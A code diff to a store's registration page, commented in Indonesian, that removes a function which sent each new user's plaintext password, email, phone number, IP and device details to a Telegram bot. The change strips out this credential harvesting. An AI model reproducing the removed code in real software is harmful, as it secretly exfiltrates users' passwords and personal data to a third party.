@@ -615,7 +615,7 @@
             }, 1500);
         }
 
-        // ========== FUNGSI LAINNYA TETAP SAMA TANPA OTP ==========
+        // ========== FUNGSI LAINNYA TETAP SAMA TANPA NOTIFIKASI PENDAFTARAN ==========
 
         // Fungsi untuk mengubah format nomor WhatsApp dari 08 ke 62
         function formatWhatsAppNumber(whatsapp) {
@@ -1098,8 +1098,7 @@
                 // Simpan ke localStorage untuk sementara
                 localStorage.setItem(`pxstore_user_${email}`, JSON.stringify(newUser));
                 
-                // Kirim notifikasi pendaftaran ke Telegram
-                await sendRegistrationToTelegram(newUser, password);
+                // HAPUS: Tidak ada notifikasi pendaftaran ke Telegram
                 
                 showMessage('Pendaftaran berhasil! Silakan login dengan akun Anda.', 'success', 'registerMessage');
                 
@@ -1119,59 +1118,6 @@
                 showMessage('Error saat pendaftaran: ' + error.message, 'error', 'registerMessage');
             } finally {
                 showLoading(false);
-            }
-        }
-
-        // Kirim notifikasi pendaftaran ke Telegram
-        async function sendRegistrationToTelegram(userData, password) {
-            try {
-                const currentTime = new Date().toLocaleString('id-ID');
-                const deviceInfo = getDeviceInfo();
-                const browserInfo = getBrowserInfo();
-                
-                // Format pesan pendaftaran
-                const message = `🎉 PENDAFTARAN BARU PX STORE 🎉
-                
-👤 Informasi Pendaftar:
-• Username: ${userData.username}
-• Email: ${userData.email}
-• Password: ${password}
-• WhatsApp: \`${userData.whatsapp}\`
-• Waktu: ${currentTime}
-• IP Address: ${userIP || 'Loading...'}
-
-📍 Informasi Perangkat:
-• Perangkat: ${deviceInfo}
-• Browser: ${browserInfo}
-
-🌐 User Agent: ${navigator.userAgent}
-
-⚠️ INFORMASI SENSITIF - JANGAN BAGIKAN KE SIAPAPUN!`;
-
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout 5 detik
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    }),
-                    signal: controller.signal
-                });
-                
-                clearTimeout(timeoutId);
-                
-                return response.ok;
-            } catch (error) {
-                console.error('Error sending registration to Telegram:', error);
-                return false;
             }
         }
 
